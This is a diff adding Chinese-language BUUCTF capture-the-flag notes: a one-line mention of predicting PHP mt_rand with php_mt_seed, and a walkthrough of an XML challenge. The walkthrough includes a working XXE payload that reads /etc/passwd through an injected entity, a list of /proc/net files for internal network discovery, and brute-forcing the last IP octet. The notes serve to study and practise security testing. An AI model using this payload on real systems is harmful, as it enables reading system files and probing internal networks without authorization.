@@ -741,3 +741,53 @@ php短标签:
 //reverse逆转输出,!!!everse附近的括号!!!改了一下sql语句都会报错
 ```
 
+
+
+# buuctf 枯燥的抽奖
+
+- mt_rand伪随机数
+- php_mt_seed
+
+
+
+# buuctf true xml book
+
+`<user><username>aaa</username><password>111</password></user>`
+
+抓包之后发现时xml数据格式
+
+尝试xml
+
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE updateProfile [
+<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+
+<user><username>&xxe;</username><password>111</password></user>
+```
+
+
+
+成功回显
+
+尝试获取/flag,报错
+
+尝试内网探测命令:
+
+```
+/etc/hosts
+/proc/net/arp
+/proc/net/tcp
+/proc/net/udp
+/proc/net/dev
+/proc/net/fib_trie
+```
+
+访问/proc/net/fib_trie得到的IP直接访问错误,
+
+尝试最最后一位进行爆破
+
+![image-20240515124703693](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240515124703693.png)
+
+得到flag
